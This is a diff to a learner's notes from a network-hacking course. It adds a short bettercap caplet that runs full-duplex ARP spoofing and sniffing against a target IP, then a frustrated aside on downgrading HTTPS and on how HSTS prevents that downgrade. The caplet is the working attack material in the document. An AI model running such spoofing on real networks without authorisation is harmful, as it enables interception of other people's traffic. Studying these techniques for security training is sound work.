@@ -450,3 +450,21 @@ Another tool that has more features and support arpspoofing is `bettercap`
 **ARP spoofing attack:**
 ![bettercap help spoof](./assets/bettercap_help_spoof.png)
 ![bettercap arp spoof attack](./assets/bettercap_arpspoof_attack.png)
+
+`bettercap` supports scripting (called `caplet`): `bettercap -caplet script`
+
+```caplets
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.1.44
+arp.spoof on
+arp.sniff on
+```
+
+We can **Bypassing HTTPS** but this course does not teach me anything about
+this, the instructor just tell us to download a custom script and use it in
+bettercap. Pretty disappointed. I want the concept, not the tool or fucking
+syntax. The tools can be replaced but the concepts remain. The method is to
+downgrade HTTPS requests into HTTP requests. How? He does not tell. Some
+websites use HSTS (HTTP Strict-Transport-Security) header to tell the browser
+to always use HTTPS, so we could not downgrade to HTTP with these websites.
